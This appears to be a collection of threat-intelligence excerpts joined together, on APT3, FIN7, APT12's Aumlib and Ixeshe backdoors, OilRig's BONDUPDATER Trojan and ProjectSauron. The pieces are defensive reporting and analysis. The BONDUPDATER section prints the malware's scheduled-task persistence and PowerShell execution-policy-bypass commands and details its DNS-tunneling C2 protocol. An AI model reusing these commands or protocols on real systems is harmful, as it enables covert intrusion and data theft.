Depending on the defensive setup, exfiltration could be much noisier and noticeable than attempting to hide in the noise with lay - of - the - lan d tools. The only source we were able to find for APT3 exfiltration methods is from 2012. For exfiltration, they will identify Office documents on the computer [23] [ T1005 - Data from Local System ]. They then drop the command - line Chinese language version of WinRAR and use it to compress and encrypt the discovered documents [ T1002 - Data Compressed ]. This archive will then be stored in the recycle bin [23] , usually on a machine designated as a staging server, which they move the exfiltration through [ T1074 - Data Staged ]. Data is exfiltrated over port 443 which is typically HTTPS traffic, however th ey have used SSL encryption [17] and normal HTTP [23] [ T1043 - Commonly Used Port ] .

The malicious documents do not score more than 1-3 detections. Within a couple of days, security solutions update their patterns and those documents score around 10/56 or higher,” according to their report.\\nBut by that time, the authors write, FIN7 is already deploying new tools, by simply tweaking the code or other patterns that the security software is hunting for. This technique “diminishes the usefulness of reactive, pattern-based detection rules,” according to Morphisec.\\nOther researchers have analyzed FIN7’s tactics, noting that they follow a familiar pattern for skilled hackers: Initial compromise; establish foothold; escalate privileges; maintain presence; move laterally; and finally complete mission.\\nThe constant shifting of attack modes is “At the heart of FIN7’s business model,” the Morphisec researchers conclude. “Every campaign includes enough new features to make them unknowable\\xa0… And as security vendors scramble to catch up, FIN7 is already preparing its next attack.”\\nIndeed, that swift adoption\\xa0of new techniques caused one researcher at\\xa0InfoSecurity Europe to comment of FIN7,\\xa0“In most environments, prevention is not possible,”\\xa0and detection is the best\\xa0defenders can hope for.\\nEarlier this year, when FIN7 encountered a Morphisec researcher during an incident response, the group first blocked the IP he was using and then abandoned their entire command and control infrastructure.\\nSuch caution is worthy of a high-end financial cyber crime group thought to be behind\\xa0many of the most audacious recent online bank thefts — including the one identified by Kaspersky\\xa0dubbed “Take the money, b*tch!” after a line of instructions in the code.\\nThe group were among the first to adopt super stealthy fileless malware — an attack method in which hackers eschew the download and installation of easily detectable malicious software. Instead, they use tools already installed on the target’s own computers —\\xa0powerful and widely trusted system and security\\xa0programs like\\xa0PowerShell\\xa0or\\xa0Metasploit\\xa0— to inject their malicious code directly into the computer’s working memory.\\nThe commands to do this are typically hidden in an attachment, abusing a functionality like Visual Basic, Object Linking or — as in last week’s example — Dynamic Data Exchange or DDE. It is these attachment lures that the Morphisec researchers analyzed for their timeline.\\nThe lures rely on social engineering — Microsoft users will generally get a pop-up box asking them if they want to “enable content” or “update links” in the document they’re opening — and are typically spear-phished very carefully at a small number of targets.\\nThe kind of pop-up window displayed by malicious Word attachments using fileless malware\\nEarlier this year, FIN7 was suspected of being behind an attack that used emails appearing to come from the SEC’s Electronic Data Gathering, Analysis and Retrieval (EDGAR) online filing system. The emails bore a Microsoft Word attachment titled “Important changes to form 10K.”\\nA 10K is a form that public companies have to submit to the SEC every\\xa0year, and the targets were people involved in their company’s filings — often meaning their email address was listed on public documents.\\nLast week, researchers at Cisco Talos saw spear-phishing emails, with a similarly spoofed SEC address, bearing an attachment that used DDE to launch a “complex multi-stage infection process,” typical of FIN7.\\n-In this Story-\\nDynamic Data Exchange or DDE, fileless malware, FIN7, Morphisec\\nRelated news\\nFinancial\\n'EventBot' comes online...\\nby Sean Lyngaas • 1 day ago\\nFinancial\\nThe latest in FBI...\\nby Sean Lyngaas • 3 days ago\\nFinancial\\nHackers spoof SBA to try...\\nby Sean Lyngaas • 4 days ago\\nAd Specs\\nSponsor\\nRSS\\nPrivacy Policy\\n© 2020 Scoop News Group\\n|\\nAll Rights Reserved\\nSearch for:\\nThe best cybersecurity news, delivered straight to your inbox.\\nSign up for our daily newsletter.\\nPrivacy Policy\\nWe use cookies to provide you with the best experience across all Scoop News Group websites.

FireEye researchers spotted the malware when analyzing a recent attempted attack on an organization involved in shaping economic policy.\\nAnd a new version of Ixeshe, which has been in service since 2009 to attack targets in East Asia, uses new network traffic patterns, possibly to evade traditional network security systems.\\nThe updates are significant for both of the longstanding malware families; before this year, Aumlib had not changed since at least May 2011, and Ixeshe had not evolved since at least December 2011.\\nBACKGROUND\\nCybercriminals are constantly evolving and adapting in their attempts to bypass computer network defenses. But, larger, more successful threat actors tend to evolve at a slower rate.\\nAs long as these actors regularly achieve their objective (stealing sensitive data), they are not motivated to update or rethink their techniques, tactics, or procedures (TTPs). These threat actors’ tactics follow the same principles of evolution – successful techniques propagate, and unsuccessful ones are abandoned. Attackers do not change their approach unless an external force or environmental shift compels them to. As the old saying goes: If it ain’t broke, don’t fix it.\\nSo when a larger, successful threat actor changes up tactics, the move always piques our attention. Naturally, our first priority is ensuring that we detect the new or altered TTPs. But we also attempt to figure out why the adversary changed — what broke? — so that we can predict if and when they will change again in the future.\\nWe observed an example of this phenomenon around May. About four months after The New York Times publicized an attack on its network, the attackers behind the intrusion deployed updated versions of their Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe malware families [2].\\nThe previous versions of Aumlib had not changed since at least May 2011, and Ixeshe had not evolved since at least December 2011.\\nWe cannot say for sure whether the attackers were responding to the scrutiny they received in the wake of the episode. But we do know the change was sudden. Akin to turning a battleship, retooling TTPs of large threat actors is formidable. Such a move requires recoding malware, updating infrastructure, and possibly retraining workers on new processes.\\nThe following sections detail the changes to Backdoor.APT.Aumlib and Backdoor.APT.Ixeshe.\\nBackdoor.APT.Aumlib\\nAumlib has been used in targeted attacks for years. Older variants of this malware family generated the following POST request:\\nPOST /bbs/info.asp HTTP/1.1\\nData sent via this POST request transmitted in clear text in the following structure:\\n<VICTIM BIOS NAME>|<CAMPAIGN ID>|<VICTIM EXTERNAL IP>|<VICTIM OS>|\\nA recently observed malware sample (hash value 832f5e01be536da71d5b3f7e41938cfb) appears to be a modified variant of Aumlib.\\nThe sample, which was deployed against an organization involved in shaping economic policy, was downloaded from the following URL:\\nstatus[.]acmetoy[.]com/DD/myScript.js or status[.]acmetoy[.]com/DD/css.css\\nThe sample generated the following traffic:\\nThis output reveals the following changes when compared with earlier variants:\\nThe POST URI is changed to /bbs/search.asp (as mentioned, earlier Aumlib variants used a POST URI of /bbs/info.asp.)\\nThe POST body is now encoded.\\nAdditional requests from the sample generated the following traffic:\\nThese subtle changes may be enough to circumvent existing IDS signatures designed to detect older variants of the Aumlib family.\\nThe sample 832f5e01be536da71d5b3f7e41938cfb shares code with an older Aumlib variant with the hash cb3dcde34fd9ff0e19381d99b02f9692. The sample cb3dcde34fd9ff0e19381d99b02f9692 connected to documents[.]myPicture[.]info and www[.]documents[.]myPicture[.]info and as expected generated the a POST request to /bbs/info.asp.\\nBackdoor.APT.Ixeshe\\nIxeshe has been used in targeted attacks since 2009, often against entities in East Asia [3]. Although the network traffic is encoded with a custom Base64 alphabet, the URI pattern has been largely consistent:\\n/[ACD] [EW]S[Numbers].jsp?[Base64]\\nWe analyzed a recent sample that appears to have targeted entities in Taiwan, a target consistent with previous Ixeshe activity.\\nThis sample (aa873ed803ca800ce92a39d9a683c644) exhibited network traffic that does not match the earlier pattern and therefore may evade existing network traffic signatures designed to detect Ixeshe related infections.\\nThe Base64-encoded data still contains information including the victim’s hostname and IP address but also a “mark” or “campaign tag/code” that the threat actors use to keep track of their various attacks. The mark for this particular attack was [ll65].\\nCONCLUSION\\nBased on our observations, the most successful threat actors evolve slowly and deliberately. So when they do change, pay close attention.\\nKnowing how attackers’ strategy is shifting is crucial to detecting and defending against today’s advanced threats. But knowing the “why” is equally important. That additional degree of understanding can help organizations forecast when and how a threat actor might change their behavior — because if you successfully foil their attacks, they probably will.\\nNotes\\n[1] http://www.nytimes.com/2013/01/31/technology/chinese-hackers-infiltrate-new-york-times-computers.html?pagewanted=all\\n[2] This actor is known as APT12 by Mandiant\\n[3] http://www.trendmicro.com/cloud-content/us/pdfs/security-intelligence/white-papers/wp_ixeshe.pdf\\nPrevious Post\\nNext Post\\nPromotion\\nSubscribe\\nShare\\nRecent\\nRSS\\nEmail UpdatesInformation and insight on today's advanced threats from FireEye.\\nShare\\nRecent Posts\\n28 Apr 2020Excelerating Analysis, Part 2 — X[LOOKUP] Gon’ Pivot To Ya\\n27 Apr 2020Putting the Model to Work: Enabling Defenders With Vulnerability\\nIntelligence — Intelligence for Vulnerability Management, Part Four\\n22 Apr 2020Vietnamese Threat Actors APT32 Targeting Wuhan Government and Chinese\\nMinistry of Emergency Management in Latest Example of COVID-19 Related Espionage\\nRSS Feed: Stay Connected\\nCompany\\nWhy FireEye?\\nCustomer Stories\\nCareers\\nCertifications and Compliance\\nInvestor Relations\\nSupplier Documents\\nNews and Events\\nNewsroom\\nPress Releases\\nWebinars\\nEvents\\nAwards and Honors\\nEmail Preferences\\nTechnical Support\\nIncident?\\nReport Security Issue\\nContact Support\\nCustomer Portal\\nCommunities\\nDocumentation Portal\\nFireEye Blogs\\nThreat Research\\nFireEye Stories\\nIndustry Perspectives\\nThreat Map\\nView the Latest Threats\\nContact Us\\n+1 877-347-3393\\nStay Connected\\nLinkedIn\\nTwitter\\nFacebook\\nYouTube\\nPodcast\\nCette page est également disponible en français.\\nVersion française\\nDiese Seite ist auch auf Deutsch verfügbar\\nZur deutschen Seite wechseln\\n日本語ページを\\n見る\\n해당 페이지는 한글 버전으로 보실 수 있습니다\\n바로 가기\\nContinue viewing this page in English\\nCopyright\\xa0©\\xa02020\\xa0FireEye, Inc.\\xa0All rights reserved.\\xa0Privacy & Cookies Policy | Privacy Shield | Legal Documentation\\nSite Language\\nEnglish\\nMy preferred language:\\nEnglish (English)\\nFrench (Français)\\nGerman (Deutsch)\\nJapanese (日本語)\\nKorean (한국어)\\nMore languages\",\n",

Often preferring homegrown tools and malware, OilRig continually modifies their malware and tools to accomplish their objectives. In August 2018, Unit 42 observed OilRig targeting a government organization using spear-phishing emails to deliver an updated version of a Trojan known as BONDUPDATER. BONDUPDATER is a PowerShell-based Trojan first discovered by FireEye in mid-November 2017, when OilRig targeted a different Middle Eastern governmental organization.\\nThe BONDUPDATER Trojan contains basic backdoor functionality, allowing threat actors to upload and download files, as well as the ability to execute commands. BONDUPDATER, like other OilRig tools, uses DNS tunneling to communicate with its C2 server. During the past month, Unit 42 observed several attacks against a Middle Eastern government leveraging an updated version of the BONDUPDATER malware, which now includes the ability to use TXT records within its DNS tunneling protocol for its C2 communications.\\nA New Series of Attacks\\nIn mid-August, the Oilrig threat group sent what appeared to be a highly targeted phishing email to a high-ranking office in a Middle Eastern nation. The email had no subject and what initially drew our attention to this attack was the content of the spear phishing email.\\nFigure 1. Spear phishing email sent by the Oilrig threat group\\nAttached to the email was a malicious document named “N56.15.doc” (SHA256: 7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00) which contained a macro that attempted to install a new version of the BONDUPDATER Trojan.\\nFigure 2. Microsoft Word document with embedded macros and PowerShell\\nUpdated BONDUPDATER\\nThe spear-phishing email had an attached Microsoft Word document that contained a macro responsible for installing a new variant of BONDUPDATER. The macro begins this installation process by creating two files on the system at the following location:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.vbs (SHA256: c0018a2e36c7ef8aa15b81001a19c4127ad7cd21ae410c1f854e5dadfa98b322)\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.ps1 (SHA256: d5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7)\\nThe macro finishes by running the dropped VBScript “AppPool.vbs” file by running “wscript C:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.vbs”. When first executed, the “AppPool.vbs” file will create the following scheduled task to execute every minute, which provides BONDUPDATER persistence and the ability to continually run on the system as the Trojan does not have a main loop to carry out its functionality:\\ncmd.exe /C schtasks /create /F /sc minute /mo 1 /tn “\\\\WindowsAppPool\\\\AppPool” /tr “wscript /b “C:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.vbs””\\nAfter creating the scheduled task, the VBScript will execute the “AppPool.ps1” script dropped by the macro using the following command line:\\nPowerShell.exe -exec bypass -file C:\\\\ProgramData\\\\WindowsAppPool\\\\AppPool.ps1\\nSubsequent executions of “AppPool.vbs” will check for the existence of a file named “quid”, which, if present, will also use the above PowerShell script to run “AppPool.ps1”. The PowerShell script creates the “quid” file upon its first execution to avoid creating multiple scheduled tasks.\\nThe “AppPool.ps1” file is a PowerShell script that is a variant of the BONDUPDATER payload. BONDUPDATER, like other OilRig payloads, uses DNS tunneling to communicate with its C2 server. This variant of the BONDUPDATER Trojan has a new lock file, which involves creating a lock file at the following location which will write the current PowerShell process identifier (PID) to this file:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\lock\\nThe purpose of this lock file is to only have one instance of the Trojan running at one time. However, it also uses this lock file to determine how long the PowerShell process has been executing, as it checks the creation time of the file lock against the current time to determine if the PowerShell process has been running for more than ten minutes. If it has, the script will stop the process based on the PID in the lock file and delete the lock file. Future executions of the PowerShell script will fully execute as the lock file will no longer exist on the system. This suggests the threat actors may have experienced issues with this Trojan running for extended periods in the past, likely related to the communication loops that we will discuss later.\\nThis BONDUPDATER variant also creates the following file that it will use to store a unique identifier for the system, which is generated by obtaining a random number between 10 and 99 and appending the first 8 characters of a generated GUID:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\quid\\nThe BONDUPDATER Trojan then creates several folders that it will use to store files it receives from the C2 server and files that it generates or gathers to send to the C2 server. The folder names are:\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\files\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\<unique ID from quid file>\\\\receivebox\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\<unique ID from quid file>\\\\sendbox\\nC:\\\\ProgramData\\\\WindowsAppPool\\\\<unique ID from quid file>\\\\done\\nEven though the script creates the “files” folder, it does not appear that the Trojan uses these folders within the code. The Trojan uses the “receivebox” folder to store files obtained from the C2 server, while the “sendbox” folder is used to store files that the Trojan will upload to the server. The Trojan uses the filenames of the file received from the C2 server stored in the “receivebox” folder to determine how to handle the file, which is explained below.\\nThe BONDUPDATER sample retains its original command handling and C2 communication functionality. This process involves communicating with the C2 server to receive a file and using a character in the filename as the command. The Trojan’s command handler checks the trailing character of the filename to process the file contents, which can be seen in Table 1.\\nTrailing Character/Command\\nPurpose\\nDescription\\n0\\nExecute command\\nReads the contents of the file and runs them as a command with “cmd.exe”. The output of the command is saved to a file whose name starts with “proc” and is stored in the “sendbox” folder, which the Trojan will send to the C2 server.\\n1\\nDownload file\\nReads the contents of the file for a path to a file to download. Copies the specified file to a file in the “sendbox” folder for the Trojan to send to the C2 server.\\nAny other character\\nUpload file\\nUsed to store a file on the system. The file is moved to the “done” folder, which stores the file for future use. The Trojan writes “200<>[path to stored file]” to a file in the “sendbox” folder to notify the C2 that the file was downloaded successfully.\\nTable 1 Commands available in BONDUPDATER and their purpose\\nAfter handling the command, BONDUPDATER will send files it saved in the “sendbox” folder to the C2 server, after which it terminates and relies on the scheduled task to run again in the future.\\nAs discussed above, the BONDUPDATER Trojan uses a DNS tunneling protocol to receive files from the C2 server for processing. This particular BONDUPDATER sample includes two different variations of the DNS tunneling protocol, one using DNS A records, and one using DNS TXT records to transmit data from the C2 to the Trojan. The use of TXT records for C2 communications appears to be a new feature to the BONDUPDATER Trojan.\\nThe DNS tunneling protocol uses carefully crafted subdomains sent to the authoritative name server of the C2 domain, which in this specific sample was the domain “withyourface[.]com”. The Trojan generates subdomains differently when it sends data to the C2 compared to when it is looking to receive data from the C2, regardless of which DNS tunneling protocol is used for communications. The format of the generated domains for both sending and receiving starts with the previously generated GUID created to uniquely identify the system. However, the Trojan inserts a part number value and an action type character into this GUID string at random offsets. The part number value is a three-digit string that corresponds to the chunk of data the Trojan is attempting to transmit. The action type is a single character that notifies the C2 the type of communication the Trojan is carrying out. The two static characters “C” and “T” in the subdomain surround two digits, which help the C2 server find the part number and action type mixed in within the GUID string at random offsets.\\nSending data format\\n<GUID with part number and action character><sequence number><between 1 and 7 random characters>C<index of part number><index of action>T.<data chunk>.<filename>.<c2 domain>\\nReceiving data format\\n<GUID with part number and action character><sequence number><between 1 and 7 random characters>C<index of part number><index of action>T.<c2 domain>\\nDepending on whether the C2 communications use DNS A or TXT records, different action types are used when generating the subdomains to notify the C2 what format to use to respond. Table 2 shows action types used in outbound requests and the purpose of the request.\\nAction Type\\nA/TXT Communications\\nDescription\\nM\\nA/TXT\\nInitial beacon\\n0\\nA\\nProvide filename\\n1\\nA\\nProvide data\\nW\\nTXT\\nProvide filename\\nD\\nTXT\\nProvide data\\nP\\nTXT\\nTXT method failed, notify C2 to switch to A records\\nTable 2 Action types used within the DNS tunneling protocol and their purpose\\nFor example, the Trojan will begin communicating with its C2 server by sending an initial beacon with the action character “M”. This initial beacon will follow the receiving format, as seen in the following example:\\nFigure 3. Example domain for the C2 beacon with its format explained\\nThe offset to the part number and action type in the GUID above may not seem correct at first, as the action type does not appear to be at offset 8 in the string. However, this is correct, as the action type is inserted at offset 8 before the part number was inserted at offset 3. Therefore, we believe the C2 server just adds the two offsets together to find the actual location of the action type in the string.\\nOriginal Data Transfer using DNS Tunneling\\nThe original data transfer process within BONDUPDATER looked for specific A records within answers to DNS queries, shown in Table 3. The Trojan processed the A records in the C2 response to obtain a filename, which specifically looks for an IPv4 address within the A record with “24.125” in the first two octets. The Trojan appends the remaining two octets of this A record to the string “rcvd” and uses this as the filename to save future data to in the “receivebox” folder. This IP address also instructs the Trojan to treat following DNS A records as data. The following DNS A records are split on the “.” and each of the first three octets are treated as data, whereas the fourth octet is used as a counter to obtain the correct chunk of data. Lastly, the Trojan looks for the A record “1.2.3” as a signal to write the provided data to the specified file, which is then subjected to the previously mentioned file-based command handler.\\nIP Address\\nDescription\\n24.125.\\\\d.\\\\d\\nSets the filename “rcvd\\\\d\\\\d” in the “receivebox” to store data for processing\\n\\\\d.\\\\d.\\\\d.\\\\d\\nFirst three \\\\d are treated as data and the fourth is used to keep track of the sequence\\n1.2.3.\\\\d\\nInstructs the Trojan to write the data to the file and begin processing it for commands.\\nTable 3 IP Addresses and their meanings within the original data transfer process in BONDUPDATER\\nNew Data Transfer using DNS Tunneling\\nThis BONDUPDATER sample has a new method to obtain files from the C2 server using a series of DNS TXT queries. This method follows a similar process as the original method but uses DNS TXT results to obtain a filename and the data to write to the file. Once data is written to the file system, this method uses the same command handler as the original method to process the contents of the file based on the trailing character of the filename, as seen in Table 1.\\nThe C2 can initiate the new command handling functionality by responding to the initial beacon with a DNS A record of “99.250.250.199”. The script will enter a loop attempting to communicate with its C2 every 50 milliseconds, looking for a series of responses with specific characters that the script will use as instructions to determine how to handle the result of the TXT record, which can be seen in Table 4. The Trojan will split each TXT record from the C2 response on the character “>”, with the data to the left of the “>” character used as the instruction and the data to the right as the data.\\nInstruction\\nDescription\\nN\\nIdle. Set action type of next query to “W”\\nS\\nReceive data from C2. Decode data portion as base64. Sets the action type of future queries to the C2 to “D”.\\nS000s\\nUse data to as a portion of the filename to save data to. The data is appended to the string “rcvd”, which will be saved in the “receivebox” folder. Sets the action type of future queries to the C2 to “D”.\\nE\\nWrite bytes provided by the “S” command to the file resulting from the “S000s” command. The breaks the loop for the script to process the downloaded file.\\nC\\nCancel communications by exiting the loop.\\nTable 4 Instructions within the new data transfer process in BONDUPDATER and their meanings\\nWhile we have not seen the C2 use this TXT record-based communications, we believe the process would involve the C2 providing a TXT record with the “S000s” instruction to set the filename to which data is saved. The C2 would then provide a series of “S” instructions to provide data, followed by the “E” instruction to write that data to the file, which would then be subjected to the command handler.\\nConclusion\\nAs expected, OilRig is continuing their onslaught of attacks well into 2018 with continued targeting in the Middle East. Sometimes developing new tools, OilRig also often uses what has worked in the past, including developing variants of previously used tools and malware. This reduces development time and capitalizes on previous versions of the tool and its success.\\nOilrig is a highly diverse and very resourceful threat actor, employing a litany of methods and tools to compromise victims, but Palo Alto Networks customers are protected from this OilRig attack and BONDUPDATER by:\\nAutoFocus customers can track this Trojan with the Bondupdater_Docs tag\\nAll known BONDUPDATER document samples are marked with malicious verdicts in WildFire\\nAll known BONDUPDATER document C2 domains have DNS signatures and are classified as Command and Control\\nIndicators\\nBONDUPDATER C2\\nwithyourface[.]com\\nBONDUPDATER Dropper Docs\\n7cbad6b3f505a199d6766a86b41ed23786bbb99dab9cae6c18936afdc2512f00\\nc0018a2e36c7ef8aa15b81001a19c4127ad7cd21ae410c1f854e5dadfa98b322\\nd5c1822a36f2e7107d0d4c005c26978d00bcb34a587bd9ccf11ae7761ec73fb7\\nGet updates from\\nPalo Alto Networks!\\nSign up to receive the latest news, cyber threat intelligence and research from us\\nPlease enter your email address!\\nPlease mark, I'm not a robot!\\nBy submitting this form, you agree to our Terms of Use and acknowledge our Privacy Statement.\\nPopular ResourcesResource Center\\nBlog\\nCommunities\\nTech Docs\\nUnit 42\\nSitemap\\nLegal NoticesPrivacy\\nTerms of Use\\nDocuments\\nAccountManage Subscriptions\\nReport a Vulnerability\\n© 2020 Palo Alto Networks, Inc.

Contact: intelreports@kaspersky.com\\nIntroduction:\\nOver the last few years, the number of “APT-related” incidents described in the media has grown significantly. For many of these, though, the designation “APT”, indicating an “Advanced Persistent Threat”, is usually an exaggeration. With some notable exceptions, few of the threat actors usually described in the media are advanced. These exceptions, which in our opinion represent the pinnacle of cyberespionage tools: the truly “advanced” threat actors out there, are Equation, Regin, Duqu or Careto. Another such an exceptional espionage platform is “ProjectSauron”, also known as “Strider”.\\nWhat differentiates a truly advanced threat actor from a wannabe APT? Here are a few features that characterize the ‘top’ cyberespionage groups:\\nThe use of zero day exploits\\nUnknown, never identified infection vectors\\nHave compromised multiple government organizations in several countries\\nHave successfully stolen information for many years before being discovered\\nHave the ability to steal information from air gapped networks\\nSupport multiple covert exfiltration channels on various protocols\\nMalware modules which can exist only in memory without touching the disk\\nUnusual persistence techniques which sometime use undocumented OS features\\n“ProjectSauron” easily covers many of these points.\\nFrom discovery to detection:\\nWhen talking about long-standing cyber-espionage campaigns, many people wonder why it took so long to catch them. Perhaps one of the explanations is having the right tools for the right job. Trying to catch government or military grade malware requires specialized technologies and products. One such product is Kaspersky’s AntiTargeted Attacks Platform (KATA). In September 2015, our anti-targeted attack technologies caught a previously unknown attack. The suspicious module was an executable library, loaded in the memory of a Windows domain controller (DC). The library was registered as a Windows password filter and had access to sensitive data in cleartext. Additional research revealed signs of massive activity from a new threat actor that we codenamed ‘ProjectSauron’, responsible for large-scale attacks against key governmental entities in several countries.\\n“SAURON” – internal name used in the Lua scripts\\nProjectSauron comprises a top-of-the-top modular cyber-espionage platform in terms of technical sophistication, designed to enable long-term campaigns through stealthy survival mechanisms coupled with multiple exfiltration methods. Technical details show how attackers learned from other extremely advanced actors in order to avoid repeating their mistakes. For example, all artifacts are customized per given target, reducing their value as indicators of compromise for any other victim.\\nSome other key features of ProjectSauron:\\nIt is a modular platform designed to enable long-term cyber-espionage campaigns.\\nAll modules and network protocols use strong encryption algorithms, such as RC6, RC5, RC4, AES, Salsa20, etc.\\nIt uses a modified Lua scripting engine to implement the core platform and its plugins.\\nThere are upwards of 50 different plugin types.\\nThe actor behind ProjectSauron has a high interest in communication encryption software widely used by targeted governmental organizations. It steals encryption keys, configuration files, and IP addresses of the key infrastructure servers related to the encryption software.\\nIt is able to exfiltrate data from air-gapped networks by using specially-prepared USB storage drives where data is stored in an area invisible to the operation system.\\nThe platform makes extensive use of the DNS protocol for data exfiltration and real-time status reporting.\\nThe APT was operational as early as June 2011 and remained active until April 2016.\\nThe initial infection vector used to penetrate victim networks remains unknown.\\nThe attackers utilize legitimate software distribution channels for lateral movement within infected networks.\\nTo help our readers better understand the ProjectSauron attack platform, we’ve prepared an FAQ which brings together some of the most important points about this attacker and its tools. A brief technical report is also available, including IOCs and Yara rules.\\nOur colleagues from Symantec have also released their analysis on ProjectSauron / Strider. You can read it here: http://www.symantec.com/connect/blogs/strider-cyberespionage-group-turns-eye-sauron-targets\\nProjectSauron FAQ:\\n1. What is ProjectSauron?\\nProjectSauron is the name for a top level modular cyber-espionage platform, designed to enable and manage long-term campaigns through stealthy survival mechanisms coupled with multiple exfiltration methods.\\nTechnical details show how attackers learned from other extremely advanced actors in order to avoid repeating their mistakes. As such, all artifacts are customized per given target, reducing their value as indicators of compromise for any other victim.\\nUsually APT campaigns have a geographical nexus, aimed at extracting information within a specific region or from a given industry. That usually results in several infections in countries within that region, or in the targeted industry around the world. Interestingly, ProjectSauron seems to be dedicated to just a couple of countries, focused on collecting high value intelligence by compromising almost all key entities it could possibly reach within the target area.\\nThe name, ProjectSauron reflects the fact that the code authors refer to ‘Sauron’ in the Lua scripts.\\n2. Who are the victims?\\nUsing our telemetry, we found more than 30 infected organizations in Russia, Iran, Rwanda and possibly in Italian-speaking countries as well. Many more organizations and geographies are likely to be affected.\\nThe attacked organizations are key entities that provide core state functions:\\nGovernment\\nScientific research centers\\nMilitary\\nTelecommunication providers\\nFinance\\n3. Have you notified victims?\\nAs usual, Kaspersky Lab actively collaborates with industry partners, CERTs and law enforcement agencies to notify victims and help to mitigate the threat. We also rely on public awareness to spread information about it. If you need more information about this actor, please contact intelreports@kaspersky.com.\\n4. For how long have the attackers been active?\\nForensic analysis indicates that the APT has been operational since at least June 2011 and was still active in 2016. Although it appears to have largely ceased, there is a chance that it is still active on computer systems that are not covered by Kaspersky Lab solutions.\\n5. Did the attackers use interesting or advanced techniques?\\nThe attackers used multiple interesting and unusual techniques, including:\\nData exfiltration and real-time status reporting using DNS requests.\\nImplant deployment using legitimate software update scripts.\\nData exfiltration from air-gapped networks through the use of specially prepared USB storage drives where the stolen data is stored in the area unused by standard tools of the operating system.\\nUsing a modified Lua scripting engine to implement the core platform and its plugins. The use of Lua components in malware is very rare – it was previously spotted in the Flame and Animal Farm attacks.\\n6. How did you discover this malware?\\nIn September 2015, Kaspersky Lab’s Anti-Targeted Attack Platform discovered anomalous network traffic in a client organization’s network. Analysis of this incident led to the discovery of a strange executable program library loaded into the memory of the domain controller server. The library was registered as a Windows password filter and had access to sensitive data such as administrative passwords in cleartext. Additional research revealed signs of activity of a previously unknown threat actor.\\n7. How does ProjectSauron operate?\\nProjectSauron usually registers its persistence module on domain controllers as a Windows LSA (Local Security Authority) password filter. This feature is typically used by system administrators to enforce password policies and validate new passwords to match specific requirements, such as length and complexity. This way, the ProjectSauron passive backdoor module starts every time any network or local user (including an administrator) logs in or changes a password, and promptly harvests the password in plaintext.\\nIn cases where domain controllers lack direct Internet access, the attackers install additional implants on other local servers which have both local network and Internet access and may pass through significant amount of network traffic, i.e. proxy-servers, web-servers, or software update servers. After that, these intermediary servers are used by ProjectSauron as internal proxy nodes for silent and inconspicuous data exfiltration, blending in with high volumes of legitimate traffic.\\nOnce installed, the main ProjectSauron modules start working as ‘sleeper cells’, displaying no activity of their own and waiting for ‘wake-up’ commands in the incoming network traffic. This method of operation ensures ProjectSauron’s extended persistence on the servers of targeted organizations.\\n8. What kind of implants does ProjectSauron use?\\nMost of ProjectSauron’s core implants are designed to work as backdoors, downloading new modules or running commands from the attacker purely in memory. The only way to capture these modules is by making a full memory dump of the infected systems.\\nAlmost all of ProjectSauron’s core implants are unique, have different file names and sizes, and are individually built for each target. Each module’s timestamp, both in the file system and in its own headers, is tailored to the environment on which it is installed.\\nSecondary ProjectSauron modules are designed to perform specific functions like stealing documents, recording keystrokes, and stealing encryption keys from both infected computers and attached USB sticks.\\nProjectSauron implements a modular architecture using its own virtual file system to store additional modules (plugins) and a modified Lua interpreter to execute internal scripts. There are upwards of 50 different plugin types.\\n9. What is the initial infection vector?\\nTo date, the initial infection vector used by ProjectSauron to penetrate victim networks remains unknown.\\n10. How were the ProjectSauron implants deployed within the target network?\\nIn several cases, ProjectSauron modules were deployed through the modification of scripts used by system administrators to centrally deploy legitimate software updates within the network.\\nIn essence, the attackers injected a command to start the malware by modifying existing software deployment scripts. The injected malware is a tiny module that works as a simple downloader.\\nOnce started under a network administrator account, this small downloader connects to a hard-coded internal or external IP address and downloads the bigger ProjectSauron payload from there.\\nIn cases where the ProjectSauron persistence container is stored on disk in EXE file format, it disguises the files with legitimate software file names.\\n11. What C&C infrastructure did the attackers use?\\nThe ProjectSauron actor is extremely well prepared when it comes to operational security. Running an expensive cyberespionage campaign like ProjectSauron requires vast domain and server infrastructure uniquely assigned to each victim organization and never reused again. This makes traditional network-based indicators of compromise almost useless because they won’t be reused in any other organization.\\nWe collected 28 domains linked to 11 IPs located in the United States and several European countries that might be connected to ProjectSauron campaigns. Even the diversity of ISPs selected for ProjectSauron operations makes it clear that the actor did everything possible to avoid creating patterns.\\n12. Does ProjectSauron target isolated (air-gapped) networks?\\nYes. We registered a few cases where ProjectSauron successfully penetrated air-gapped networks.\\nThe ProjectSauron toolkit contains a special module designed to move data from air-gapped networks to Internet-connected systems. To achieve this, removable USB devices are used. Once networked systems are compromised, the attackers wait for a USB drive to be attached to the infected machine.\\nThese USBs are specially formatted to reduce the size of the partition on the USB disk, reserving an amount of hidden data (several hundred megabytes) at the end of the disk for malicious purposes. This reserved space is used to create a new custom-encrypted partition that won’t be recognized by a common OS, such as Windows. The partition has its own semi-filesystem (or virtual file system, VFS) with two core directories: ‘In’ and ‘Out’.\\nThis method also bypasses many DLP products, since software that disables the plugging of unknown USB devices based on DeviceID wouldn’t prevent an attack or data leakage, because a genuine recognized USB drive was used.\\n13. Does ProjectSauron target critical infrastructure?\\nSome of the entities infected by ProjectSauron can be classified as critical infrastructure. However, we haven’t registered ProjectSauron infections inside industrial control system networks that have SCADA systems in place.\\nAlso, we have not yet seen a ProjectSauron module targeting any specific industrial hardware or software.\\n14. Did ProjectSauron use any special communication methods?\\nFor network communication, the ProjectSauron toolkit has extensive abilities, leveraging the stack of the most commonly used protocols: ICMP, UDP, TCP, DNS, SMTP and HTTP.\\nOne of the ProjectSauron plugins is the DNS data exfiltration tool. To avoid generic detection of DNS tunnels at network level, the attackers use it in low-bandwidth mode, which is why it is used solely to exfiltrate target system metadata.\\nAnother interesting feature in 